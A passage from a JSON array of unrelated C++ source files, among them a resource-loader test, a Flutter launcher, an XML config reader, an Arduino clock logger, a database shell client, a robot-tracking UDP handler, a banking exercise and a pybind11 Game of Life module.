multiply(val);\n}",
    "#include <iostream>\r\n#include \"Utility/TestProc.hpp\"\r\n#include \"Utility/RecourceLoader.hpp\"\r\n\r\nusing namespace std;\r\nusing namespace util;\r\n\r\nstruct A: public ARecource{\r\n    virtual ~A(){}\r\n\r\n    virtual void Load(){\r\n        a=1;\r\n    }  \r\n\r\n    int a;\r\n};\r\nstruct B: public ARecource{\r\n    virtual ~B(){}\r\n\r\n    virtual void Load(){\r\n        a=2;\r\n    }  \r\n\r\n    int a;\r\n};\r\nstruct C: public ARecource{\r\n    virtual ~C(){}\r\n\r\n    virtual void Load(){\r\n        a=3;\r\n    }  \r\n\r\n    int a;\r\n};\r\n\r\nvoid Test(){\r\n    Recources.Add<A>();\r\n    if(Recources.Get<A>().a!=1)throw std::logic_error(\"Cant find A, added A\");\r\n\r\n    Recources.Add<B>();\r\n    if(Recources.Get<A>().a!=1)throw std::logic_error(\"Cant find A, added A, B\");\r\n    if(Recources.Get<B>().a!=2)throw std::logic_error(\"Cant find B, added A, B\");\r\n\r\n    Recources.Add<C>();\r\n    if(Recources.Get<A>().a!=1)throw std::logic_error(\"Cant find A, added A, B, C\");\r\n    if(Recources.Get<B>().a!=2)throw std::logic_error(\"Cant find B, added A, B, C\");\r\n    if(Recources.Get<C>().a!=3)throw std::logic_error(\"Cant find C, added A, B, C\");\r\n}\r\n\r\nint main(){\r\n    testutil::TestException(\"recource-loader\", Test);\r\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"aws_project\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//#define WIN32_LEAN_AND_MEAN\n//#define _CRT_SECURE_NO_WARNINGS\n\n#include <Windows.h>\n#include <WinUser.h>\n\n#include <string>\n#include <cstdio>\n#include <iostream>\n#include <strsafe.h>\n\n#include <fstream>\n#include <tinyxml/tinyxml.h>\n\n\n\n\n\n\n#include <shlobj_core.h>\n#include <direct.h>\n\n#define DEFAULT_CONFIG_DIRNAME \"UnrealBowling\"\n\nint QuitProgram(int exit)\n{\n\tsystem(\"pause\");\n\treturn exit;\n}\n\nstd::string DefaultConfigDir(HANDLE userToken = NULL)\n{\n\tPWSTR appdata = NULL;\n\n\t// Make Win32 request for default path to Local Application Data\n\tif (SHGetKnownFolderPath(FOLDERID_LocalAppData, KF_FLAG_DEFAULT_PATH, userToken, &appdata) == S_OK)\n\t{\n\t\tchar temp_cstr[MAX_PATH];\n\t\tsize_t nbytes = 0;\n\n\t\t// Convert character(s) to non-wide format\n\t\tif (wcstombs_s(&nbytes, temp_cstr, appdata, MAX_PATH) == 0)\n\t\t{\n\t\t\t// Return path concatenated with default config directory name\n\t\t\treturn std::string(temp_cstr, nbytes)\n\t\t\t\t.append(\"\\\\\")\n\t\t\t\t.append(DEFAULT_CONFIG_DIRNAME);\n\t\t}\n\t}\n\n\treturn {};\n}\n\nint main(int argc, char** argv)\n{\n\t// \"C:\\Users\\Crunchy\\AppData\\Local\\UnrealBowling\\KeepAlive.run.xml\"\n\t// \n\t// \n\t//std::string xmlFilePath = DefaultConfigDir().append(\"\\\\KeepAlive.test.xml\");\n\t//std::string xmlFilePath = \"C:\\\\Users\\\\Crunchy\\\\Developer\\\\tmp\\\\testfile.xml\";\n\tstd::string xmlFilePath = \"C:\\\\Users\\\\Crunchy\\\\AppData\\\\Local\\\\UnrealBowling\\\\KeepAlive.run.xml\";\n\n\t//std::string xmlFilePath = DefaultConfigDir() + \"\\\\KeepAlive.run.xml\";\n\tstd::cout << \"Reading XML Document : \" << xmlFilePath << std::endl;\n\n\tstd::ifstream filein;\n\tfilein.open(xmlFilePath.c_str());\n\n\tif (filein.is_open())\n\t{\n\t\tstd::cout << \"WE GOOD FAM\" << std::endl;\n\t\tfilein.close();\n\t}\n\n\n\tTiXmlDocument* document = new TiXmlDocument();\n\tif (!document->LoadFile(xmlFilePath.c_str()))\n\t{\n\t\tstd::cerr << \"UNABLE TO LOAD XML DOCUMENT\" << std::endl;\n\t\treturn QuitProgram(1);\n\t}\n\n\tstd::cout << \"OPENED XML DOCUMENT\" << std::endl;\n\n\treturn QuitProgram(0);\n}",
    "// Brij Malhotra\n// hw4_5.cpp\n// Purpose: Make a program that 1) Evaluates and calculates an expression provided by the user \n// 2) Finds the average of a window of integers \n\n#include \"Queue.h\"\n#include <iostream>\n\nusing namespace std;\n\n// Class definition\n\nDynamicQueue::DynamicQueue() {\n    front = nullptr;\n    rear = nullptr;\n    numItems = 0;\n}\n\nDynamicQueue::~DynamicQueue() {\n    QueueNode * curr = front;\n    QueueNode * next = curr->next;\n\n    while (curr!=nullptr) {\n        next = curr->next;\n        delete curr;\n        curr = next;\n    }\n\n    front = nullptr;\n    rear = nullptr;\n}\n\nvoid DynamicQueue::enqueue(int num) {\n    QueueNode * newNode = new QueueNode;\n    newNode->value = num;\n    newNode->next = nullptr;\n\n    if (isEmpty()) {\n        front = newNode;\n        rear = newNode;\n    } else {\n        rear->next = newNode;\n        rear = newNode;\n    }\n\n    numItems++;\n}\n\nint DynamicQueue::dequeue() {\n    if (isEmpty()) {\n        cout << \" The queue is empty.\\n\";\n        return -1;\n    } else {\n        int value  = front->value;\n        QueueNode * temp = front; \n        front = front->next;\n\n        if (front == nullptr) {\n            rear = nullptr;\n        }\n        \n        delete temp;\n        numItems--;\n        return value;\n    }\n}\n\nbool DynamicQueue::isEmpty() const { return numItems == 0; }\n\nvoid DynamicQueue::average(int num) { // This function gets the average of the window size N\n    QueueNode * curr = front;\n    QueueNode * window = front;\n\n    if (!front) {\n        cout << \" The queue is empty, therefore no average values are available.\";\n    } else {\n        cout << \"    The average in each window of size \" << num << \" is: [ \";\n\n        while (curr!=nullptr) {\n            int avg = 0;\n\n            curr = window; // The window pointer points to the one which is ahead so that later on the current can point to\n            window = curr->next; // it and continue the iteration of averaging for the next window\n            \n            for (int i = 0; i < num; i++) {\n                avg += curr->value;\n                curr = curr->next;\n            }\n\n            avg = avg / num;\n\n            cout << avg << \" \";\n       }\n       cout << \"]\";\n    }\n}",
    "#include <RTC.h>\n#include <ArduinoJson.h>\n#include <SD.h>\n#include <SD_Handle.h>\n#include <LiquidCrystal_I2C.h>\n\n#define CS_PIN 5\n#define FILE_NAME \"/log.json\"\n\nDS1307_RTC RTC;\n\nFile root;\n\nSDHandle sdHandle;\n\nLiquidCrystal_I2C lcd(0x27, 16, 2);\n\nvoid setup(void)\n{\n  Serial.begin(115200); /* Inicializar baudrate a 115200 */\n  RTC.RTC_init();       /* Inicializar configuraci\u00f3n del reloj */\n\n  Serial.println(F(\"El DS-1307 ha sido configurado exitosamente.\"));\n\n  // --- INICIALIZACION DE M\u00d3DULO SD ---\n  Serial.print(F(\"Initializing SD card... \"));\n\n  if (!SD.begin(CS_PIN))\n  {\n    Serial.println(F(\"Card initialization failed!\"));\n    while (true)\n      ;\n  }\n\n  Serial.println(F(\"Initialization done.\"));\n\n  Serial.println(F(\"Files in the card:\"));\n  root = SD.open(\"/\");\n  // PrintDirectory(root, 0);\n  Serial.println(\"\");\n\n  if (!SD.exists(FILE_NAME))\n  {\n    Serial.println(F(\"Error opening log.json\"));\n    File jsonDocument = SD.open(FILE_NAME, FILE_WRITE);\n    jsonDocument.close();\n  }\n\n  // Checar nuevamente\n  if (!SD.exists(FILE_NAME))\n  {\n    Serial.println(F(\"Problemas para crear el archivo\"));\n    return;\n  }\n\n  lcd.init();\n  lcd.backlight();\n}\n\nvoid loop(void)\n{\n  // File jsonDocument = SD.open(FILE_NAME, FILE_WRITE);\n  char outputJson[256];\n\n  RTC.get_time();\n\n  JsonDocument doc;\n\n  doc[\"fecha\"] = RTC.format_date();\n  doc[\"hora\"] = RTC.format_time();\n  String fecha_s = doc[\"fecha\"];\n  String hora_s = doc[\"hora\"];\n\n  lcd.setCursor(0, 0);\n  lcd.print(\"Fecha:\");\n  lcd.print(fecha_s);\n  lcd.setCursor(0, 1);\n  lcd.print(\"Hora:\");\n  lcd.print(hora_s);\n\n  if (serializeJson(doc, outputJson) == 0)\n  {\n    Serial.println(F(\"Failed to write to file\"));\n  }\n  serializeJson(doc, outputJson);\n\n  sdHandle.appendFile(SD, FILE_NAME, outputJson);\n\n  doc.clear();\n\n  // RTC.show_time(); /* Dar formato y mostrar por consola serial */\n\n  delay(1000);\n}\n",
    "#include <netdb.h>\n#include <netinet/in.h>\n#include <readline/history.h>\n#include <readline/readline.h>\n#include <sys/socket.h>\n#include <sys/time.h>\n#include <sys/types.h>\n#include <sys/un.h>\n#include <termios.h>\n#include <unistd.h>\n\n#include <cassert>\n#include <iostream>\n#include <memory>\n#include <string>\n\n#define MAX_MEM_BUFFER_SIZE 8192\n#define PORT_DEFAULT 8765\n\nbool is_exit_command(std::string &cmd) { return cmd == \"exit\" || cmd == \"exit;\" || cmd == \"bye\" || cmd == \"bye;\"; }\n\nint init_unix_sock(const char *unix_sock_path) {\n    int sockfd = socket(PF_UNIX, SOCK_STREAM, 0);\n    if (sockfd < 0) {\n        fprintf(stderr, \"failed to create unix socket. %s\", strerror(errno));\n        return -1;\n    }\n\n    struct sockaddr_un sockaddr;\n    memset(&sockaddr, 0, sizeof(sockaddr));\n    sockaddr.sun_family = PF_UNIX;\n    snprintf(sockaddr.sun_path, sizeof(sockaddr.sun_path), \"%s\", unix_sock_path);\n\n    if (connect(sockfd, (struct sockaddr *)&sockaddr, sizeof(sockaddr)) < 0) {\n        fprintf(stderr, \"failed to connect to server. unix socket path '%s'. error %s\", sockaddr.sun_path,\n                strerror(errno));\n        close(sockfd);\n        return -1;\n    }\n    return sockfd;\n}\n\nint init_tcp_sock(const char *server_host, int server_port) {\n    struct hostent *host;\n    struct sockaddr_in serv_addr;\n\n    if ((host = gethostbyname(server_host)) == NULL) {\n        fprintf(stderr, \"gethostbyname failed. errmsg=%d:%s\\n\", errno, strerror(errno));\n        return -1;\n    }\n\n    int sockfd;\n    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {\n        fprintf(stderr, \"create socket error. errmsg=%d:%s\\n\", errno, strerror(errno));\n        return -1;\n    }\n\n    serv_addr.sin_family = AF_INET;\n    serv_addr.sin_port = htons(server_port);\n    serv_addr.sin_addr = *((struct in_addr *)host->h_addr);\n    bzero(&(serv_addr.sin_zero), 8);\n\n    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(struct sockaddr)) == -1) {\n        fprintf(stderr, \"Failed to connect. errmsg=%d:%s\\n\", errno, strerror(errno));\n        close(sockfd);\n        return -1;\n    }\n    return sockfd;\n}\n\nint main(int argc, char *argv[]) {\n    int ret = 0;  // set_terminal_noncanonical();\n                  //    if (ret < 0) {\n                  //        printf(\"Warning: failed to set terminal non canonical. Long command may be \"\n                  //               \"handled incorrect\\n\");\n                  //    }\n\n    const char *unix_socket_path = nullptr;\n    const char *server_host = \"127.0.0.1\";  // 127.0.0.1 192.168.31.25\n    int server_port = PORT_DEFAULT;\n    int opt;\n\n    while ((opt = getopt(argc, argv, \"s:h:p:\")) > 0) {\n        switch (opt) {\n            case 's':\n                unix_socket_path = optarg;\n                break;\n            case 'p':\n                char *ptr;\n                server_port = (int)strtol(optarg, &ptr, 10);\n                break;\n            case 'h':\n                server_host = optarg;\n                break;\n            default:\n                break;\n        }\n    }\n\n    // const char *prompt_str = \"RucBase > \";\n\n    int sockfd, send_bytes;\n    // char send[MAXLINE];\n\n    if (unix_socket_path != nullptr) {\n        sockfd = init_unix_sock(unix_socket_path);\n    } else {\n        sockfd = init_tcp_sock(server_host, server_port);\n    }\n    if (sockfd < 0) {\n        return 1;\n    }\n\n    char recv_buf[MAX_MEM_BUFFER_SIZE];\n\n    while (1) {\n        char *line_read = readline(\"Rucbase> \");\n        if (line_read == nullptr) {\n            // EOF encountered\n            break;\n        }\n        std::string command = line_read;\n        free(line_read);\n\n        if (!command.empty()) {\n            add_history(command.c_str());\n            if (is_exit_command(command)) {\n                printf(\"The client will be closed.\\n\");\n                break;\n            }\n\n            if ((send_bytes = write(sockfd, command.c_str(), command.length() + 1)) == -1) {\n                // fprintf(stderr, \"send error: %d:%s \\n\", errno, strerror(errno));\n                std::cerr << \"send error: \" << errno << \":\" << strerror(errno) << \" \\n\" << std::endl;\n                exit(1);\n            }\n            int len = recv(sockfd, recv_buf, MAX_MEM_BUFFER_SIZE, 0);\n            if (len < 0) {\n                fprintf(stderr, \"Connection was broken: %s\\n\", strerror(errno));\n                break;\n            } else if (len == 0) {\n                printf(\"Connection has been closed\\n\");\n                break;\n            } else {\n                for (int i = 0; i <= len; i++) {\n                    if (recv_buf[i] == '\\0') {\n                        break;\n                    } else {\n                        printf(\"%c\", recv_buf[i]);\n                    }\n                }\n                memset(recv_buf, 0, MAX_MEM_BUFFER_SIZE);\n            }\n        }\n    }\n    close(sockfd);\n    printf(\"Bye.\\n\");\n    return 0;\n}\n",
    "#include <cstdio>\n#include <netinet/in.h>\n\n#include \"onltrack_handler.h\"\n#include \"compv_handler.h\"\n#include \"connection_handler.h\"\n#include \"transform_calc.h\"\n\nusing std::cout;\nusing std::cerr;\nusing std::endl;\n\ntypedef enum {\n    ONLTRACK_CMD_INIT,\n    ONLTRACK_CMD_START = 'S',\n    ONLTRACK_CMD_PLAY = 'P',\n    ONLTRACK_CMD_END = 'F'\n} Onltrack_Cmd_t;\n\nstatic Hyundai_Data_t sendIncrements{};\n\nstatic void handleOnltrackStartCmd(const Hyundai_Data_t *eePos_worldFrame);\nstatic void handleOnltrackPlayCmd(const Hyundai_Data_t *eePos_worldFrame);\nstatic void handleOnltrackEndCmd();\nstatic void printOnltrackData(const Hyundai_Data_t *data, bool send_or_recv);\nstatic void zeroingPosIncrements(Hyundai_Data_t *increments);\nstatic void zeroingOriIncrements(Hyundai_Data_t *increments);\n\n\n// Handles messages received from Hyundai via onltrack\nvoid Onltrack_AnswerHandle(const Hyundai_Data_t* eePos_worldFrame, long buflen){\n    switch (eePos_worldFrame->Command) {\n        case ONLTRACK_CMD_START:\n            handleOnltrackStartCmd(eePos_worldFrame);\n            break;\n\n        case ONLTRACK_CMD_PLAY:\n            if (Connection_GetCompvSocketState() == TCP_CLIENT_CONNECTED) {\n                handleOnltrackPlayCmd(eePos_worldFrame);\n            }\n            break;\n\n        case ONLTRACK_CMD_END:\n            handleOnltrackEndCmd();\n            break;\n\n        case ONLTRACK_CMD_INIT:\n            //TODO: did not receive cmd yet, just skip\n            break;\n\n        default:\n            cerr << \"Onltrack_AnswerHandle(): Unexpected cmd from OnlTrack received\" << endl;\n            //TODO: handle?\n            break;\n    }\n}\n\n// Handles Start cmd received from Hyundai via onltrack\n// Answers to Start request, turns OnLTrack on\nstatic void handleOnltrackStartCmd(const Hyundai_Data_t *eePos_worldFrame){\n    int sockfd_onltrack = Connection_GetSockfd(SOCKTYPE_ONLTRACK);\n    sockaddr_in sockaddr_onltrack = Connection_GetSockAddr(SOCKTYPE_ONLTRACK);\n\n    printOnltrackData(eePos_worldFrame, PRINT_RECV);\n\n    // Setup struct for Start answer\n    Hyundai_Data_t sendStartCmd{};\n    zeroingPosIncrements(&sendStartCmd);\n    zeroingOriIncrements(&sendStartCmd);\n    sendStartCmd.Command = ONLTRACK_CMD_START;\n    sendStartCmd.Count = 0;\n    sendStartCmd.State = 1;\n\n    Connection_SendUdp(sockfd_onltrack, sockaddr_onltrack, &sendStartCmd, sizeof(sendStartCmd));\n\n    printOnltrackData(&sendStartCmd, PRINT_SEND);\n    printf(\"On-line tracking is started by Hi5 controller.\\n\");\n\n    // Send first Play cmd to initiate the request-answer process\n    Hyundai_Data_t sendPlayCmd{};\n    zeroingPosIncrements(&sendPlayCmd);\n    zeroingOriIncrements(&sendPlayCmd);\n    sendPlayCmd.Command = ONLTRACK_CMD_PLAY;\n\n    Connection_SendUdp(sockfd_onltrack, sockaddr_onltrack, &sendPlayCmd, sizeof(sendStartCmd));\n    printOnltrackData(&sendPlayCmd, PRINT_SEND);\n\n    Connection_SetOnltrackState(ONLTRACK_ON);\n}\n\n\n// Handles Play request received from Hyundai via onltrack\n// Computes increments and sends them to Hyundai\nstatic void handleOnltrackPlayCmd(const Hyundai_Data_t *eePos_worldFrame){\n    int sockfd_onltrack = Connection_GetSockfd(SOCKTYPE_ONLTRACK);\n    sockaddr_in sockaddr_onltrack = Connection_GetSockAddr(SOCKTYPE_ONLTRACK);\n    Cartesian_Pos_t pos_increments{0,0,0,0,0,0};\n    Cartesian_Pos_t ori_increments{0,0,0,0,0,0};\n\n    Cartesian_Pos_t* targetPos_camFrame = Compv_GetTargetPosCamFrame();\n    Cartesian_Pos_t* targetPos_worldFrame = Compv_GetTargetPosWorldFrame();\n\n    //printOnltrackData(eePos_worldFrame, PRINT_RECV);\n\n    // Send zero increments while zeros are received from Compv, so robot does not move\n    if ((targetPos_camFrame->x == 0) && (targetPos_camFrame->y == 0) && (targetPos_camFrame->z == 0)) {\n        zeroingPosIncrements(&sendIncrements);\n    }\n    else {\n        pos_increments = Transform_CalculatePositionIncrements(eePos_worldFrame, targetPos_worldFrame);\n    }\n\n    // Send zero increments while zeros are received from Compv, so robot does not move\n    if ((targetPos_camFrame->rotx == 0) && (targetPos_camFrame->roty == 0) && (targetPos_camFrame->rotz == 0)) {\n        zeroingOriIncrements(&sendIncrements);\n    }\n    else {\n        ori_increments = Transform_CalculateOrientationIncrements(eePos_worldFrame, targetPos_worldFrame);\n    }\n\n    sendIncrements.coord[0] = pos_increments.x;\n    sendIncrements.coord[1] = pos_increments.y;\n    sendIncrements.coord[2] = pos_increments.z;\n    sendIncrements.coord[3] = ori_increments.rotx;\n    sendIncrements.coord[4] = ori_increments.roty;\n    sendIncrements.coord[5] = ori_increments.rotz;\n\n    sendIncrements.Command = ONLTRACK_CMD_PLAY;\n\n    // Send increments to hyundai\n    Connection_SendUdp(sockfd_onltrack, sockaddr_onltrack, &sendIncrements, sizeof(sendIncrements));\n\n    for(int i = 0; i < 3; i++){\n        if(sendIncrements.coord[i] > 0.5){\n            printOnltrackData(&sendIncrements, PRINT_SEND);\n        }\n    }\n\n    //printOnltrackData(&sendIncrements, PRINT_SEND);\n}\n\n\n// Handles F request re",
    "#include <iostream>\n#include <fstream>\n#include <cstdlib>\n#include <vector>\n#include <map>\nusing namespace std;\n\n#define MIN_BALANCE 500\n\nclass InsufficientFunds\n{\n};\n\nclass Account\n{\n    private:\n    long accountNumber;\n    string firstName;\n    string lastName;\n    float balance;\n    static long NextAccountNumber;\n    \n    public:\n    Account()\n    {\n    }\n    Account(string fname, string lname, float balance);\n    long getAccNo()\n    {\n        return accountNumber;\n    }\n    string getFirstName()\n    {\n        return firstName;\n    }\n    string getLastName()\n    {\n        return lastName;\n    }\n    float getBalance()\n    {\n        return balance;\n    }\n    void Deposit(float amount);\n    void Withdraw(float amount);\n    static void setLastAccountNumber(long accountNumber);\n    static long getLastAccountNumber();\n    friend ofstream & operator << (ofstream & ofs, Account & acc);\n    friend ifstream & operator >> (ifstream & ifs, Account & acc);\n    friend ostream & operator << (ostream & os, Account & acc);\n};\n\nlong Account::NextAccountNumber = 0;\nclass Bank\n{\n    private:\n    map < long, Account > accounts;\n    \n    public:\n    Bank();\n    Account OpenAccount(string fname, string lname, float balance);\n    Account BalanceEnquiry(long accountNumber);\n    Account Deposit(long accountNumber, float amount);\n    Account Withdraw(long accountNumber, float amount);\n    void CloseAccount(long accountNumber);\n    void ShowAllAccounts();\n    ~Bank();\n};\n\nint main()\n{\n    Bank b;\n    Account acc;\n    int choice;\n    string fname, lname;\n    long accountNumber;\n    float balance;\n    float amount;\n\n    cout << \"***Banking System***\" << endl;\n    do\n    {\n        cout << \"\\n\\tSelect one option below:\";\n        cout << \"\\n\\t1 Open an Account\";\n        cout << \"\\n\\t2 Balance Enquiry\";\n        cout << \"\\n\\t3 Deposit\";\n        cout << \"\\n\\t4 Withdrawal\";\n        cout << \"\\n\\t5 Close an Account\";\n        cout << \"\\n\\t6 Show All Accounts\";\n        cout << \"\\n\\t7 Quit\";\n        cout << \"\\nEnter your choice: \";\n        cin >> choice;\n        switch (choice)\n        {\n         case 1:\n             cout << \"Enter First Name: \";\n             cin >> fname;\n             cout << \"Enter Last Name: \";\n             cin >> lname;\n             cout << \"Enter initil Balance: \";\n             cin >> balance;\n             acc = b.OpenAccount (fname, lname, balance);\n             cout << endl << \"Congradulation Account is Created\" << endl;\n             cout << acc;\n             break;\n \n         case 2:\n             cout << \"Enter Account Number:\";\n             cin >> accountNumber;\n             acc = b.BalanceEnquiry (accountNumber);\n             cout << endl << \"Your Account Details\" << endl;\n             cout << acc;\n             break;\n             \n         case 3:\n             cout << \"Enter Account Number:\";\n             cin >> accountNumber;\n             cout << \"Enter Balance:\";\n             cin >> amount;\n             acc = b.Deposit (accountNumber, amount);\n             cout << endl << \"Amount is Deposited\" << endl;\n             cout << acc;\n             break;\n             \n         case 4:\n             cout << \"Enter Account Number:\";\n             cin >> accountNumber;\n             cout << \"Enter Balance:\";\n             cin >> amount;\n             acc = b.Withdraw (accountNumber, amount);\n             cout << endl << \"Amount Withdrawn\" << endl;\n             cout << acc;\n             break;\n             \n         case 5:\n             cout << \"Enter Account Number:\";\n             cin >> accountNumber;\n             b.CloseAccount (accountNumber);\n             cout << endl << \"Account is Closed\" << endl;\n             cout << acc;\n             \n         case 6:\n             b.ShowAllAccounts ();\n             break;\n             \n         case 7:\n             break;\n             \n         default:\n             cout << \"\\nEnter corret choice\";\n             exit (0);\n        }\n    }\n    while (choice != 7);\n    return 0;\n}\n\nAccount::Account (string fname, string lname, float balance)\n{\n    NextAccountNumber++;\n    accountNumber = NextAccountNumber;\n    firstName = fname;\n    lastName = lname;\n    this->balance = balance;\n}\n\nvoid Account::Deposit (float amount)\n{\n    balance += amount;\n}\n\nvoid Account::Withdraw (float amount)\n{\n    if (balance - amount < MIN_BALANCE)\n        throw InsufficientFunds ();\n    balance -= amount;\n}\n\nvoid Account::setLastAccountNumber (long accountNumber)\n{\n    NextAccountNumber = accountNumber;\n}\n\nlong Account::getLastAccountNumber ()\n{\n    return NextAccountNumber;\n}\n\nofstream & operator << (ofstream & ofs, Account & acc)\n{\n    ofs << acc.accountNumber << endl;\n    ofs << acc.firstName << endl;\n    ofs << acc.lastName << endl;\n    ofs << acc.balance << endl;\n    return ofs;\n}\n\nifstream & operator >> (ifstream & ifs, Account & acc)\n{\n    ifs >> acc.accountNumber;\n    ifs >> acc.firstName;\n    ifs >> acc.lastName;\n    ifs >> acc.balance;\n    return ifs;\n}\n\nostream & operator << (ostream & os, Account & acc)\n{",
    "#include <pybind11/pybind11.h>\n#include <pybind11/stl.h>\n#include <pybind11/numpy.h>\n#include <pybind11/eigen.h>\n#include <Eigen/Core>\n#include <iostream>\n#include <optional>\n\nnamespace py = pybind11;\n\npy::array_t<bool> evolve_conway(py::array_t<bool> input, size_t T, std::optional<Eigen::MatrixX2i> perturbs) {\n    py::buffer_info buf = input.request();\n    if (buf.ndim != 2) {\n        throw std::runtime_error(\"Number of dimensions must be two\");\n    }\n    size_t nx = buf.shape[0];\n    size_t ny = buf.shape[1];\n    size_t nt = T;\n    std::vector<size_t> shape = {nt, nx, ny};\n    std::vector<size_t> strides = {nx * ny * sizeof(bool), ny * sizeof(bool), sizeof(bool)};\n    py::array_t<bool> output(shape, strides);\n\n    bool *input_ptr = (bool *) input.request().ptr;\n    bool *output_ptr = (bool *) output.request().ptr;\n\n    py::array_t<bool> tmp({nx, ny});\n    auto tmp_ptr = (bool *) tmp.request().ptr;\n    auto tmp_accessor = tmp.mutable_unchecked<2>();\n\n    memcpy(output_ptr, input_ptr, nx * ny * sizeof(bool)); // copy initial state\n    auto voxels = output.mutable_unchecked<3>();\n    for(size_t t = 0; t < nt - 1; ++t) { // evolve t times\n      if(perturbs) {\n        std::fill(tmp_ptr, tmp_ptr + nx * ny, false);\n        auto delta_x = perturbs->coeff(t, 0);\n        auto delta_y = perturbs->coeff(t, 1);\n        for(size_t i = 0; i < nx; ++i) {\n          for(size_t j = 0; j < ny; ++j) {\n            // TODO: can we do this in place?\n            tmp_accessor(i, j) = voxels(t, (i - delta_x) % nx, (j - delta_y) % ny);\n          }\n        }\n        size_t offset = t * nx * ny;\n        memcpy(output_ptr + offset, tmp_ptr, nx * ny * sizeof(bool));\n      }\n      for(size_t i = 0; i < nx; ++i) {\n        for(size_t j = 0; j < ny; ++j) {\n          size_t nearest_alive_count = 0;\n          voxels(t, (i-1) % nx, (j-1) % ny) ? nearest_alive_count++ : 0;\n          voxels(t, (i-1) % nx, j) ? nearest_alive_count++ : 0;\n          voxels(t, (i-1) % nx, (j+1) % ny) ? nearest_alive_count++ : 0;\n          voxels(t, i, (j-1) % ny) ? nearest_alive_count++ : 0;\n          voxels(t, i, (j+1) % ny) ? nearest_alive_count++ : 0;\n          voxels(t, (i+1) % nx, (j-1) % ny) ? nearest_alive_count++ : 0;\n          voxels(t, (i+1) % nx, j) ? nearest_alive_count++ : 0;\n          voxels(t, (i+1) % nx, (j+1) % ny) ? nearest_alive_count++ : 0;\n          if(voxels(t, i, j)) {\n            voxels(t+1, i, j) = nearest_alive_count == 2 || nearest_alive_count == 3;\n          } else {\n            voxels(t+1, i, j) = nearest_alive_count == 3;\n          }\n        }\n      }\n    }\n    return output;\n}\n\nPYBIND11_MODULE(_conway_tower, m) {\n  m.def(\"evolve_conway\", &evolve_conway, \"Evolve Conway's game of life\", py::arg(\"input\"), py::arg(\"T\"), py::arg(\"perturbs\") = std::nullopt);\n}\n",
    "#include \"HDF5DataReader.hpp\"\n\n#include <ossia/network/common/destination_qualifiers.hpp>\n\n#include <DataReader/IncludeH5.hpp>\n#include <highfive/boost.hpp>\n#include <highfive/highfive.hpp>\nnamespace DataReader\n{\n\nvoid HDF5_Reader1D::operator()(halp::tick_musical t)\n{\n  if(!dataset->isValid())\n    return;\n\n  // Time is the first index.\n  // We work proportionally:\n  auto& d = *dataset;\n  std::size_t n_rows = dataset_dims[0];\n  auto idx = std::size_t(this->inputs.percent * n_rows) % n_rows;\n\n  thread_local boost::multi_array<double, 1> arr1;\n  thread_local boost::multi_array<double, 2> arr2;\n  thread_local boost::multi_array<double, 3> arr3;\n  thread_local boost::multi_array<double, 4> arr4;\n  thread_local boost::multi_array<double, 5> arr5;\n\n  const auto ndims = dataset_dims.size();\n  thread_local std::vector<std::size_t> offsets;\n  offsets.clear();\n  thread_local std::vector<std::size_t> sizes;\n  sizes.clear();\n\n  switch(ndims)\n  {\n    case 2: {\n      offsets = {idx, 0}; // read one row at idx, all columns considered\n      switch(dataset_dims[1])\n      {\n        case 1: {\n          sizes = {1, 1};\n          float a;\n          d.select(offsets, sizes).read(a);\n          outputs.out.value = a;\n          break;\n        }\n        case 2: {\n          sizes = {1, 2};\n          std::array<std::array<float, 2>, 1> a;\n          d.select(offsets, sizes).read(a);\n          outputs.out.value = a[0];\n          break;\n        }\n        case 3: {\n          sizes = {1, 3};\n          std::array<std::array<float, 3>, 1> a;\n          d.select(offsets, sizes).read(a);\n          outputs.out.value = a[0];\n          break;\n        }\n        case 4: {\n          sizes = {1, 4};\n          std::array<std::array<float, 4>, 1> a;\n          d.select(offsets, sizes).read(a);\n          outputs.out.value = a[0];\n          break;\n        }\n        default: {\n          sizes = {1, dataset_dims[1]};\n          std::array<std::vector<float>, 1> a;\n          d.select(offsets, sizes).read(a);\n          // FIXME suboptimal\n          outputs.out.value = std::vector<ossia::value>(a[0].begin(), a[0].end());\n\n          break;\n        }\n      }\n      break;\n    }\n    case 3:\n      // d.select({idx, 0}, {1, 0}).read(arr1);\n      break;\n    case 4:\n      // d.select({idx, 0}, {1, 0}).read(arr3);\n      break;\n    case 5:\n      //d.select({idx, 0}, {1, 0}).read(arr4);\n      break;\n  }\n\n  {\n  }\n}\n}\n",
